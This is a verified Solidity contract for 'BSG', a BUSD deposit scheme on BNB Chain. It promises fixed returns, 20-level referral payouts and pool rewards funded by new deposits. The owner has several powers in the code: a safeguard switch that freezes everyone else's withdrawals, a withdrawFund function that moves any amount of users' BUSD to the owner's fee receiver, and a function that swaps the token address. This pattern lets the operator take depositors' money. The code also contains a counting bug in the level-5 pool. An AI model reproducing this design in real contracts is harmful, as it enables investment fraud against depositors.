/**
 *Submitted for verification at BscScan.com on 2022-10-01
*/

// SPDX-License-Identifier: GPLv3



pragma solidity ^0.8.16;



library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



contract BSG is Ownable {

    using SafeMath for uint256;

    IERC20 public busd;

    uint256 private constant baseDivider = 10000;

    uint256 public feePercents = 1000;

    uint256 public  widthfeePercents = 500;

    uint256 public constant minDeposit = 50e18;

    uint256 public constant maxDeposit = 5000e18;

    uint256 public  tradingSplit = 1875;

    uint256 private constant timeStep = 120;

    uint256 private constant dayPerCycle = 840;

    uint256 private constant dayRewardPercents = 200;  

    uint256 private constant maxAddFreeze = 5200;

    uint256 private constant referDepth = 20;

    uint256 public constant directPercents = 500;

    uint256[9] private level4Percents = [100, 200, 300, 100, 200, 100, 100, 100, 100];

    uint256[10] private level5Percents = [50, 50, 50, 50, 50, 50, 50, 50, 50, 50];

    uint256 public level4royalty = 30;

    uint256 public level4allow = 20;

    uint256 public level5royalty = 50;

    uint256 public level5allow = 25;

    uint256 public emptyPool4Rewards ;
    uint256 public emptyPool5Rewards  ;

    uint256[5] private balDown = [10e22, 30e22, 100e22, 500e22, 1000e22];

    uint256[5] private balDownRate = [1000, 1500, 2000, 5000, 6000];

    uint256[5] private balRecover = [15e22, 50e22, 150e22, 500e22, 1000e22];

    mapping(uint256=>bool) public balStatus; // bal=>status

    address[2] public feeReceivers;

    address public defaultRefer;

    uint256 public immutable startTime;

    uint256 public lastDistribute;

    uint256 public totalUser;

    uint256 public level4Pool;

    uint256 public level5Pool;

    address[] public level4Users;

    address[] public level5Users;

    bool public safeguard;  //putting safeguard on will halt all non-owner functions


    struct OrderInfo {

        uint256 amount;

        uint256 start;

        uint256 unfreeze;

        bool isUnfreezed;        

    }



    mapping(address => OrderInfo[]) public orderInfos;



    address[] public depositors;



    struct UserInfo {

        address referrer;

        uint256 start;

        uint256 level; // 0, 1, 2, 3, 4, 5

        uint256 maxDeposit;

        uint256 totalDeposit;

        uint256 teamNum;

        uint256 maxDirectDeposit;

        uint256 teamTotalDeposit;

        uint256 totalFreezed;

        uint256 totalRevenue;      
        

    }



    mapping(address=>UserInfo) public userInfo;

    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit; // day=>user=>amount

    mapping(address => mapping(uint256 => address[])) public teamUsers;



    struct RewardInfo{

        uint256 capitals;

        uint256 statics;

        uint256 directs;

        uint256 level4Freezed;

        uint256 level4Released;

        uint256 level5Left;

        uint256 level5Freezed;

        uint256 level5Released;

        uint256 star;

        uint256 star5;   

    }



    mapping(address=>RewardInfo) public rewardInfo;



    bool public isFreezeReward;



    

    event Deposit(address user, uint256 amount);

    event Withdraw(address user, uint256 withdrawable);



    constructor(address _busdAddr, address _defaultRefer, address[2] memory _feeReceivers)  {

        busd = IERC20(_busdAddr);

        feeReceivers = _feeReceivers;

        startTime = block.timestamp;

        lastDistribute = block.timestamp;

        defaultRefer = _defaultRefer;

    }



    function register(address _referral) private {

        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer , "invalid refer");

        UserInfo storage user = userInfo[msg.sender];       

        user.referrer = _referral;

        user.start = block.timestamp;

        _updateTeamNum(msg.sender);

        totalUser = totalUser.add(1);

        

    }



    function deposit(address referrer, uint256 _amount) external {

        require(!safeguard,"Safeguard is On");

        require(!isContract(msg.sender),  'No contract address allowed');

        busd.transferFrom(msg.sender, address(this), _amount);

        if(userInfo[msg.sender].referrer == address(0))
        {
            register(referrer);
        }

        _deposit(msg.sender, _amount);

        emit Deposit(msg.sender, _amount);

    }

   
    function distributePoolRewards() public {

        require(!safeguard,"Safeguard is On");

        require(!isContract(msg.sender),  'No contract address allowed');

        if(block.timestamp > lastDistribute.add(timeStep)){

            //uint256 dayNow = getCurDay();

            _distributeLevelPool();

            lastDistribute = block.timestamp;

        }

    }



    function withdraw() external {             

        require(!safeguard,"Safeguard is On"); 

        require(!isContract(msg.sender),  'No contract address allowed');
        
        distributePoolRewards();

        RewardInfo storage userRewards = rewardInfo[msg.sender];
       
        uint256 staticReward = userRewards.statics;         

        uint256 dynamicReward = userRewards.directs.add(userRewards.level4Released).add(userRewards.level5Released).add(userRewards.star).add(userRewards.star5);

        uint256 withdrawable = staticReward.add(dynamicReward);

        userRewards.statics = 0;

        userRewards.directs = 0;

        userRewards.level4Released = 0;

        userRewards.level5Released = 0;

        userRewards.star = 0;

        userRewards.star5 = 0;

        withdrawable = withdrawable.add(userRewards.capitals);

        userRewards.capitals = 0;
      

        if(withdrawable>0)
        {
            uint256 withdrawfee = withdrawable.mul(widthfeePercents).div(baseDivider);

            busd.transfer(feeReceivers[0], withdrawfee.div(2));

            busd.transfer(feeReceivers[1], withdrawfee.div(2));                      

            busd.transfer(msg.sender, withdrawable - withdrawfee);
            
            uint256 bal = busd.balanceOf(address(this));

            _setFreezeReward(bal);

            emit Withdraw(msg.sender, withdrawable);
        }
       

    }

    function getCurDay() public view returns(uint256) {

        return (block.timestamp.sub(startTime)).div(timeStep);

    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {

        return teamUsers[_user][_layer].length;

    }

    function getOrderLength(address _user) public view returns(uint256) {

        return orderInfos[_user].length;

    }

    function getDepositorsLength() external view returns(uint256) {

        return depositors.length;

    }

    function getMaxFreezing(address _user) public view returns(uint256) {

        uint256 maxFreezing;        

        for(uint256 i = orderInfos[_user].length; i > 0; i--){

            OrderInfo storage order = orderInfos[_user][i - 1];

            if(order.unfreeze > block.timestamp){

                if(order.amount > maxFreezing){

                    maxFreezing = order.amount;

                }

            }else{

                break;

            }

        }

        return maxFreezing;

    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){

        uint256 totalTeam;

        uint256 maxTeam;

        uint256 otherTeam;

        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){

            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);

            totalTeam = totalTeam.add(userTotalTeam);

            if(userTotalTeam > maxTeam){

                maxTeam = userTotalTeam;

            }

        }

        otherTeam = totalTeam.sub(maxTeam);

        return(maxTeam, otherTeam, totalTeam);

    }
  

    function _updateTeamNum(address _user) private {

        UserInfo storage user = userInfo[_user];

        address upline = user.referrer;

        for(uint256 i = 0; i < referDepth; i++){

            if(upline != address(0)){

                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);

                teamUsers[upline][i].push(_user);

                _updateLevel(upline);

                if(upline == defaultRefer) break;

                upline = userInfo[upline].referrer;

            }else{

                break;

            }

        }

    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {

        UserInfo storage user = userInfo[_user];

        address upline = user.referrer;

        for(uint256 i = 0; i < referDepth; i++){

            if(upline != address(0)){

                if(userInfo[upline].teamTotalDeposit > _amount){

                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);

                }else{

                    userInfo[upline].teamTotalDeposit = 0;

                }

                if(upline == defaultRefer) break;

                upline = userInfo[upline].referrer;

            }else{

                break;

            }

        }

    }

    function _updateReferInfo(address _user, uint256 _amount) private {

        UserInfo storage user = userInfo[_user];

        address upline = user.referrer;

        for(uint256 i = 0; i < referDepth; i++){

            if(upline != address(0)){

                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);

                _updateLevel(upline);

                if(upline == defaultRefer) break;

                upline = userInfo[upline].referrer;

            }else{

                break;

            }

        }

    }
 

    function _updateLevel(address _user) private {

        UserInfo storage user = userInfo[_user];

        uint256 levelNow = _calLevelNow(_user);

        if(levelNow > user.level){

            user.level = levelNow;

            if(levelNow == 4){

                level4Users.push(_user);

            }
            else if(levelNow == 5){
                uint i = 0;
                while (level4Users[i] != _user) {
                    i++;
                }

                delete level4Users[i];

                level5Users.push(_user);

            }

        }

    }

    function _calLevelNow(address _user) private view returns(uint256) {

        UserInfo storage user = userInfo[_user];

        uint256 total = user.maxDeposit;

        uint256 levelNow;

        if(total >= 1000e18){

            (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);

            //if(total >= 5000e18 && user.teamNum >= 200 && maxTeam >= 100000e18 && otherTeam >= 100000e18){
            if(total >= 5000e18 && user.teamNum >= 5 && maxTeam >= 7000e18 && otherTeam >= 7000e18){

                levelNow = 5;

            }//else if(total >= 1000e18 && user.teamNum >= 40 && maxTeam >= 7000e18 && otherTeam >= 7000e18){
                else if(total >= 1000e18 && user.teamNum >= 2 && maxTeam >= 5000e18 && otherTeam >= 5000e18){

                levelNow = 4;

            }else{

                levelNow = 3;

            }

        }else if(total >= 500e18){

            levelNow = 2;

        }else if(total >= 50e18){

            levelNow = 1;

        }

        return levelNow;

    }

    function _deposit(address _user, uint256 _amount) private {

        UserInfo storage user = userInfo[_user];

        

        require(_amount >= minDeposit, "less than min");

        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");

        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");

        if(user.maxDeposit == 0){

            user.maxDeposit = _amount;

        }else if(user.maxDeposit < _amount){

            user.maxDeposit = _amount;

        }

        _distributeDeposit(_amount);

        depositors.push(_user);

        user.totalDeposit = user.totalDeposit.add(_amount);

        user.totalFreezed = user.totalFreezed.add(_amount);

        _updateLevel(msg.sender);

        uint256 addFreeze = (orderInfos[_user].length).mul(timeStep);

        if(addFreeze > maxAddFreeze){

            addFreeze = maxAddFreeze;

        }
        
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);        

        orderInfos[_user].push(OrderInfo(

            _amount,

            block.timestamp,

            unfreezeTime,

            false

        ));
            
        _unfreezeFundAndUpdateReward(msg.sender, _amount);

        distributePoolRewards();

        _updateReferInfo(msg.sender, _amount);

        _updateReward(msg.sender, _amount);

        _releaseUpRewards(msg.sender, _amount);

        uint256 bal = busd.balanceOf(address(this));

        _balActived(bal);

        if(isFreezeReward){

            _setFreezeReward(bal);

        }

    }

    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {

        UserInfo storage user = userInfo[_user];

        bool isUnfreezeCapital;        

        for(uint256 i = 0; i < orderInfos[_user].length; i++){

            OrderInfo storage order = orderInfos[_user][i];

            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount){

                order.isUnfreezed = true;

                isUnfreezeCapital = true;

                if(user.totalFreezed > order.amount){

                    user.totalFreezed = user.totalFreezed.sub(order.amount);

                }else{

                    user.totalFreezed = 0;

                }

                _removeInvalidDeposit(_user, order.amount);

                uint256 staticReward = order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider);

                //uint256 staticReward = order.amount.mul(order.daypercent).mul(dayPerCycle).div(timeStep).div(baseDivider);

                if(isFreezeReward){

                    if(user.totalFreezed > user.totalRevenue){

                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);

                        if(staticReward > leftCapital){

                            staticReward = leftCapital;

                        }

                    }else{

                        staticReward = 0;

                    }

                }

                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);

                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);

                user.totalRevenue = user.totalRevenue.add(staticReward);

                break;

            }

        }


        if(!isUnfreezeCapital){

            RewardInfo storage userReward = rewardInfo[_user];

            if(userReward.level5Freezed > 0){

                uint256 release = _amount;

                if(_amount >= userReward.level5Freezed){

                    release = userReward.level5Freezed;

                }

                userReward.level5Freezed = userReward.level5Freezed.sub(release);

                userReward.level5Released = userReward.level5Released.add(release);

                user.totalRevenue = user.totalRevenue.add(release);

            }

        }               

    }


    function _distributeLevelPool() private {

          uint256 level4Count;

          for(uint256 i = 0; i < level4Users.length; i++){

              if(userInfo[level4Users[i]].level == 4 && getMaxFreezing(level4Users[i])>0){

                  level4Count = level4Count.add(1);

              }

          }          
        uint256 totalrewards;
          if(level4Count > 0){

              uint256 level4reward = level4Pool.div(level4Count);              

              for(uint256 i = 0; i < level4Users.length; i++){

                  if(userInfo[level4Users[i]].level == 4){

                      rewardInfo[level4Users[i]].star = rewardInfo[level4Users[i]].star.add(level4reward);

                      userInfo[level4Users[i]].totalRevenue = userInfo[level4Users[i]].totalRevenue.add(level4reward);      

                      totalrewards = totalrewards.add(level4reward) ;              
                  }                  
              }
          }              
         
          if(level4Pool > totalrewards)
          {
              level4Pool = level4Pool.sub(totalrewards);
              emptyPool4Rewards = emptyPool4Rewards.add(level4Pool);
              busd.transfer(feeReceivers[0], level4Pool);
          }
         
            level4Pool = 0;

        totalrewards = 0;
          uint256 level5Count;

          for(uint256 i = 0; i < level5Users.length; i++){

              if(userInfo[level5Users[i]].level == 4){

                  level5Count = level5Count.add(1);

              }

          }
          
          if(level5Count > 0){

              uint256 level5reward = level5Pool.div(level5Count);              

              for(uint256 i = 0; i < level5Users.length; i++){

                  if(userInfo[level5Users[i]].level == 5 && getMaxFreezing(level5Users[i])>0){

                      rewardInfo[level5Users[i]].star5 = rewardInfo[level5Users[i]].star5.add(level5reward);

                      userInfo[level5Users[i]].totalRevenue = userInfo[level5Users[i]].totalRevenue.add(level5reward);   

                      totalrewards = totalrewards.add(level5reward) ;                    

                  }

              }                                   

          }
           if(level5Pool > totalrewards)
          {
              level5Pool = level5Pool.sub(totalrewards);
              emptyPool5Rewards = emptyPool5Rewards.add(level5Pool);
              busd.transfer(feeReceivers[0], level5Pool);
          }

           level5Pool = 0;  

      }



    function _distributeDeposit(uint256 _amount) private {

        uint256 fee = _amount.mul(feePercents).div(baseDivider);

        busd.transfer(feeReceivers[0], fee);

        uint256 tradingSplitamount = _amount.mul(tradingSplit).div(baseDivider);

        busd.transfer(feeReceivers[1], tradingSplitamount);        

        uint256 level4 = _amount.mul(level4royalty + level4allow).div(baseDivider);

        level4Pool = level4Pool.add(level4);

        uint256 level5 = _amount.mul(level5royalty + level5allow).div(baseDivider);

        level5Pool = level5Pool.add(level5);

    }



    function _updateReward(address _user, uint256 _amount) private {

        UserInfo storage user = userInfo[_user];

        address upline = user.referrer;

        for(uint256 i = 0; i < referDepth; i++){

            if(upline != address(0)){

                uint256 newAmount = _amount;

                if(upline != defaultRefer){

                    uint256 maxFreezing = getMaxFreezing(upline);

                    if(maxFreezing < _amount){

                        newAmount = maxFreezing;

                    }

                }

                RewardInfo storage upRewards = rewardInfo[upline];

                uint256 reward;

                if(i > 9){

                    if(userInfo[upline].level > 4){

                        reward = newAmount.mul(level5Percents[i - 10]).div(baseDivider);

                        upRewards.level5Freezed = upRewards.level5Freezed.add(reward);

                    }

                }else if(i > 0){

                     reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);

                    if( userInfo[upline].level > 3){                      

                        upRewards.level4Freezed = upRewards.level4Freezed.add(reward);

                    }
                    else {                        
                         
                        upRewards.directs = upRewards.directs.add(reward);

                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                    }

                }else{

                    reward = newAmount.mul(directPercents).div(baseDivider);

                    upRewards.directs = upRewards.directs.add(reward);

                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);

                }

                if(upline == defaultRefer) break;

                upline = userInfo[upline].referrer;

            }else{

                break;

            }

        }

    }



    function _releaseUpRewards(address _user, uint256 _amount) private {

        UserInfo storage user = userInfo[_user];

        address upline = user.referrer;

        for(uint256 i = 0; i < referDepth; i++){

            if(upline != address(0)){

                uint256 newAmount = _amount;

                if(upline != defaultRefer){

                    uint256 maxFreezing = getMaxFreezing(upline);

                    if(maxFreezing < _amount){

                        newAmount = maxFreezing;

                    }

                }



                RewardInfo storage upRewards = rewardInfo[upline];

                if(i > 0 && i < 10 && userInfo[upline].level > 3){

                    if(upRewards.level4Freezed > 0){

                        uint256 level4Reward = newAmount.mul(level4Percents[i - 1]).div(baseDivider);

                        if(level4Reward > upRewards.level4Freezed){

                            level4Reward = upRewards.level4Freezed;

                        }

                        upRewards.level4Freezed = upRewards.level4Freezed.sub(level4Reward);

                        upRewards.level4Released = upRewards.level4Released.add(level4Reward);

                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(level4Reward);

                    }

                }



                if(i >= 10 && userInfo[upline].level > 4){

                    if(upRewards.level5Left > 0){

                        uint256 level5Reward = newAmount.mul(level5Percents[i - 10]).div(baseDivider);

                        if(level5Reward > upRewards.level5Left){

                            level5Reward = upRewards.level5Left;

                        }

                        upRewards.level5Left = upRewards.level5Left.sub(level5Reward);

                        upRewards.level5Freezed = upRewards.level5Freezed.add(level5Reward);

                    }

                }

                upline = userInfo[upline].referrer;

            }else{

                break;

            }

        }

    }



    function _balActived(uint256 _bal) private {

        for(uint256 i = balDown.length; i > 0; i--){

            if(_bal >= balDown[i - 1]){

                balStatus[balDown[i - 1]] = true;

                break;

            }

        }

    }



    function _setFreezeReward(uint256 _bal) private {

        for(uint256 i = balDown.length; i > 0; i--){

            if(balStatus[balDown[i - 1]]){

                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);

                if(_bal < balDown[i - 1].sub(maxDown)){

                    isFreezeReward = true;

                }else if(isFreezeReward && _bal >= balRecover[i - 1]){

                    isFreezeReward = false;

                }

                break;

            }

        }

    }

    function updatedToken(IERC20 _token) external onlyOwner returns(bool)
    {
        busd = _token;
        return true;
    }

    function updatedData(uint256 _depositFee, uint256 _tradingSplit, uint256 _level4royalty, uint256 _level4allow, uint256 _level5royalty, uint256 _level5allow, uint256 _widthfeePercents) external onlyOwner returns(bool)
    {
        require(_depositFee.add(_tradingSplit.add(_level4royalty.add(_level4allow.add(_level5royalty.add(_level5allow))))) <= 10000, "invalid percentages") ;
        require(_widthfeePercents <= 1000, "invalid percentages") ;
        feePercents = _depositFee;
        tradingSplit = _tradingSplit;
        level4royalty= _level4royalty;
        level4allow = _level4allow;        
        level5royalty = _level5royalty;
        level5allow= _level5allow;
        widthfeePercents= _widthfeePercents;
        return true;
    }

    function changeSafeguardStatus() onlyOwner public{
        if (safeguard == false){
            safeguard = true;
        }
        else{
            safeguard = false;
        }
    }
    function withdrawFund(uint256 _amount, uint256 tokenamount) public onlyOwner returns(bool)
    {
        require(!isContract(msg.sender),  'No contract address allowed');
        if(_amount >0){
            require(address(this).balance >= _amount,'Insufficient Balance');        
            payable(feeReceivers[0]).transfer(_amount);
        }
        if(tokenamount > 0)
        {
             require(busd.balanceOf(address(this)) >= tokenamount,'Insufficient Token Balance');        
            busd.transfer(feeReceivers[0], tokenamount);
        }
        return true;
    }
    function isContract(address _address) internal view returns (bool){
        uint32 size;
        assembly {
            size := extcodesize(_address)
        }
        return (size > 0);
    }
}